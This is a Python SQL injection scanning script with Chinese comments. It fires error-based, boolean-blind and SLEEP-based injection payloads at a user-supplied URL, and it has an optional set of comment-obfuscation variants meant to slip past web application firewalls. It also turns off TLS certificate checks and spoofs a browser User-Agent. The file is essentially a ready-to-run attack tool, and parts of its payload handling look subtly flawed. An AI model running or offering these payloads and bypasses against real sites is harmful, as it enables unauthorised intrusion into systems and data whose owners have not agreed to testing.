#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL 注入检测器: 报错特征 + 布尔盲注 + 时间盲注 + WAF 注释变体
用法:
  python sqli_detector.py -u "http://target.com/item?id=1"
  python sqli_detector.py -u "http://target.com/login" -p "user=admin&pass=x" --method POST
"""
import argparse
import re
import ssl
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

ERROR_PATTERNS = [
    r"SQL syntax", r"mysql_fetch", r"ORA-[0-9]{5}", r"PostgreSQL.*ERROR",
    r"Microsoft.*ODBC", r"SQLiteException", r"unclosed quotation mark",
    r"syntax error", r"Warning.*sql", r"Query failed", r"MariaDB",
    r"Unknown column", r"near \"", r"division by zero", r"you have an error",
]

WAF_COMMENTS = ["/**/", "/*!50000*/", "/*x*/", "%00", "/*", "--/*", "#/*"]

def build_request(url, params, method):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
               "Content-Type": "application/x-www-form-urlencoded"}
    if method == "GET":
        if params:
            url = url + ("&" if "?" in url else "?") + params
        req = urllib.request.Request(url, headers=headers)
    else:
        data = params.encode() if params else b""
        req = urllib.request.Request(url, data=data, headers=headers)
    return req, ctx

def send(url, params, method, timeout=8):
    req, ctx = build_request(url, params, method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", "ignore")
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        return e.code, body
    except Exception:
        return None, ""

def probe(url, params, method, payload, timeout=8):
    p = params.replace("FUZZ", payload)
    return send(url, p, method, timeout)

def main():
    ap = argparse.ArgumentParser(description="SQL 注入检测器(报错/布尔/时间盲注)")
    ap.add_argument("-u", "--url", required=True, help="目标 URL")
    ap.add_argument("-p", "--params", default="", help="参数串,用 FUZZ 标记注入点,如 id=FUZZ")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--waf", action="store_true", help="启用 WAF 注释变体绕过")
    ap.add_argument("-t", "--timeout", type=float, default=8.0)
    args = ap.parse_args()

    if not args.params:
        q = urllib.parse.urlparse(args.url).query
        if q:
            args.params = q + "&FUZZ=1"
        else:
            args.params = "FUZZ=1"

    print(f"[*] 目标: {args.url}")
    print(f"[*] 注入点: {args.params}")

    # 基线
    base_code, base_body = send(args.url, args.params.replace("FUZZ", "1"), args.method, args.timeout)
    base_len = len(base_body)
    print(f"[*] 基线: 状态 {base_code}, 长度 {base_len}")

    findings = []

    # 1) 报错注入
    print("\n[1] 报错特征检测...")
    error_payloads = ["FUZZ'", "FUZZ\"", "FUZZ')", "FUZZ\\'", "FUZZ' AND 1=1-- -", "FUZZ' AND 1=2-- -"]
    for payload in error_payloads:
        code, body = probe(args.url, args.params, args.method, payload, args.timeout)
        for pat in ERROR_PATTERNS:
            if re.search(pat, body, re.I):
                findings.append(("报错注入", payload, pat))
                print(f"    [!] 命中: {payload} -> {pat}")
                break

    # 2) 布尔盲注
    print("\n[2] 布尔盲注检测...")
    t_code, t_body = probe(args.url, args.params, args.method, "FUZZ' AND '1'='1", args.timeout)
    f_code, f_body = probe(args.url, args.params, args.method, "FUZZ' AND '1'='2", args.timeout)
    tl, fl = len(t_body), len(f_body)
    if t_code == f_code and tl != fl and abs(tl - fl) > 5:
        findings.append(("布尔盲注", "' AND '1'='1' vs '1'='2", f"长度差 {abs(tl-fl)}"))
        print(f"    [!] 布尔盲注: true={tl}B false={fl}B 长度差 {abs(tl-fl)}")

    # 3) 时间盲注
    print("\n[3] 时间盲注检测...")
    t0 = time.time()
    probe(args.url, args.params, args.method, "FUZZ' AND SLEEP(4)-- -", args.timeout)
    elapsed = time.time() - t0
    if elapsed >= 3.5:
        findings.append(("时间盲注", "' AND SLEEP(4)-- -", f"{elapsed:.1f}s"))
        print(f"    [!] 时间盲注: 响应 {elapsed:.1f}s (SLEEP(4))")

    # 4) WAF 绕过变体
    if args.waf:
        print("\n[4] WAF 注释变体绕过...")
        for c in WAF_COMMENTS:
            p = f"FUZZ'{c}OR{c}'1'='1"
            code, body = probe(args.url, args.params, args.method, p, args.timeout)
            if code != 403 and code != 406 and code is not None:
                print(f"    [*] 变体 {c} -> 状态 {code} (未被拦截)")
        t2_code, t2_body = probe(args.url, args.params, args.method,
                                 "FUZZ'/**/AND/**/SLEEP(3)-- -", args.timeout)
        if t2_code not in (403, 406):
            print(f"    [*] 注释分割时间注入未被拦截 -> 可绕过 WAF")

    print(f"\n[+] 结论: {'发现注入点! ' + '; '.join(f[0] for f in findings) if findings else '未发现注入特征'}")
    return 0 if findings else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
